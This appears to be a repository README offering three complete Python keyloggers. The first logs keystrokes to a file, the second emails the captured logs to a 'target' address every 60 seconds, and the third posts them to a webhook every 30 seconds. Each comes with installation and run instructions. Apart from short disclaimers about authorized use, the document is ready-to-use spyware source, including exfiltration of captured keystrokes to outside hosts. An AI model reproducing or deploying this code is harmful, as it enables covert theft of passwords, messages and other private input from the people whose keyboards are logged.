

# Keylogger Project

This project includes several implementations of keyloggers in Python. Each implementation captures keyboard inputs and logs them either to a file or sends them to a specified email address or webhook.

## Features

- **File-Based Keylogger**: Logs keystrokes to a file.
- **Email-Based Keylogger**: Sends logs to an email address at regular intervals.
- **Webhook-Based Keylogger**: Sends logs to a webhook at regular intervals.

**Please use this software responsibly and ensure you have proper authorization before deploying any keylogger. Unauthorized use may be illegal and unethical.**

## Implementations

### 1. File-Based Keylogger

This implementation logs keystrokes to a text file with timestamps. 

**Script: `file_keylogger.py`**

```python
import keyboard
from datetime import datetime
import uuid

# Open the file outside the function
log_file = open(f"keylog_{uuid.uuid4()}.txt", 'a')

def on_key(event):
    key = event.name
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    # Use the globally opened file
    log_file.write(f"[{timestamp}] Key: {key}\n")
    # Ensure data is saved immediately to disk
    log_file.flush()

# Start the keylogger
keyboard.on_press(on_key)
keyboard.wait()

# Close the file at the end of the program
log_file.close()
```

**How to Use:**

1. **Install Dependencies:**

    ```bash
    pip install keyboard
    ```

2. **Run the Script:**

    ```bash
    python file_keylogger.py
    ```

3. **Logs**: Check the directory for a file named `keylog_<uuid>.txt` where `<uuid>` is a unique identifier.

### 2. Email-Based Keylogger

This script logs keystrokes to a file and sends the logs to a specified email address at regular intervals.

**Script: `email_keylogger.py`**

```python
import keyboard
from datetime import datetime
import smtplib
import schedule
import time

def on_key(event):
    key = event.name
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open('keylog.txt', 'a') as f:
        f.write(f"[{timestamp}] Key: {key}\n")

keyboard.on_press(on_key)

def send_email():
    from_addr = 'your@email.de'  # Your email address
    to_addr = 'target@email.de'    # Target email address
    subject = 'Keylogs'   # Email subject
    body = ''             # Email body

    # Open the file with logged keystrokes
    with open('keylog.txt', 'r') as f:
        body = f.read()

    # Establish SMTP connection and send email
    try:
        server = smtplib.SMTP('example.smtp.server', 587) # Replace with your SMTP server
        server.starttls()
        server.login(from_addr, 'YourSecretPassword')  # Your email password
        msg = f"From: {from_addr}\nTo: {to_addr}\nSubject: {subject}\n\n{body}"
        server.sendmail(from_addr, to_addr, msg)
        server.quit()
        print('Email successfully sent!')
    except Exception as e:
        print(f"Error sending email: {e}")

# Schedule email sending every 60 seconds
schedule.every(60).seconds.do(send_email)

# Start the scheduler
while True:
    schedule.run_pending()
    time.sleep(1)
```

**How to Use:**

1. **Install Dependencies:**

    ```bash
    pip install keyboard schedule
    ```

2. **Configure SMTP Settings:**
   - Replace `example.smtp.server` with your SMTP server.
   - Replace `your@email.de` with your email address and `YourSecretPassword` with your email password.
   - Replace `target@email.de` with the recipient’s email address.

3. **Run the Script:**

    ```bash
    python email_keylogger.py
    ```

### 3. Webhook-Based Keylogger

This version sends keystroke logs to a webhook at regular intervals.

**Script: `webhook_keylogger.py`**

```python
from dhooks import Webhook
from pynput.keyboard import Listener
from threading import Timer

WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE' # Replace with your webhook URL
TIME_INTERVAL = 30  # Time between each report, in seconds.

class Keylogger:
    def __init__(self, webhook_url, interval):
        self.interval = interval
        self.webhook = Webhook(webhook_url)
        self.log = ""

    def _report(self):
        if self.log != '':
            self.webhook.send(self.log)
            self.log = ''
        Timer(self.interval, self._report).start()

    def _on_key_press(self, key):
        self.log += str(key)

    def run(self):
        self._report()
        with Listener(on_press=self._on_key_press) as listener:
            listener.join()

if __name__ == '__main__':
    Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()
```

**How to Use:**

1. **Install Dependencies:**

    ```bash
    pip install dhooks pynput
    ```

2. **Configure Webhook URL:**
   - Replace `YOUR_WEBHOOK_URL_HERE` with your webhook URL.

3. **Run the Script:**

    ```bash
    python webhook_keylogger.py
    ```

## Important Notes

- **Ethical Use**: Ensure you have permission to use keyloggers and comply with relevant laws and regulations. Unauthorized use may be illegal and unethical.
- **Dependencies**: Make sure to install the required Python libraries using `pip`.
- **Configuration**: Update the script with your SMTP server, email credentials, and webhook URL as needed.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
